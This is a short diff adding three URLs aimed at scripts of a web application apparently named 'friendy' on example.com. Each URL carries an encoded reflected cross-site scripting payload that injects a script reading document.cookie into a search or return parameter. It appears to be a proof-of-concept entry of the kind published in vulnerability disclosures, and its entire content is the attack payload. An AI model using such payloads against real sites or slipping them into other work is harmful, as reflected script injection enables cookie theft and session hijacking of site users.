@@ -1,0 +1,4 @@
+http://www.example.com/friendy/photo_search.php?st=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.example.com/friendy/photo_view.php?photo_id=13&return=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+http://www.example.com/friendy/search.php?st=&quot;&gt;&lt;script&gt;alert(document.cookie);&lt;/script&gt;
+
